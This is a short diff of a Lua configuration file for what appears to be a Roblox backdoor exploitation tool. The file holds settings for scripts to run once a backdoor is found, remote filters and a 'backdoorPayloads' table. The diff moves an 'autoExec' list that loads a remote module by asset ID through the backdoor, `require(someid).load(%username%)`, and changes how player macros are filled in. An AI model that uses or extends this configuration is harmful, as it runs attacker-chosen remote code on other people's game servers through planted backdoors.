@@ -11,10 +11,6 @@ return {
 	-- @customization
 	-- $scripts that executes after backdoor is found
 	-- $you can add any scripts here
-	["autoExec"] = {
-	[[warn("mico on top")]],
-	[[require(someid).load(%username%)]],
-	},
 
 	-- $remote filters that you don't want to be scanned
 	-- $should be thread-safe
@@ -51,12 +47,15 @@ return {
 	-- $any macro shenanigans you can add here
 	-- $prefixed as "%macro%" | example: %username% -> "Roblox", %plr_pos% -> Vector3
 	["scriptMacros"] = {
-		["username"] = player.Name,
-		["userid"] = player.UserId,
-		["placeid"] = game.PlaceId,
+		["username"] = function() return game.Players.LocalPlayer.Name end,
+        ["userid"]   = function() return game.Players.LocalPlayer.UserId end,
+        ["placeid"]  = function() return game.PlaceId end,
 		["someid"] = 7192763922
 	},
-
+	["autoExec"] = {
+	[[warn("mico on top")]],
+	[[require(someid).load(%username%)]],
+	},
 	-- $backdoor payloads
 	["backdoorPayloads"] = {
 		["default"] = {
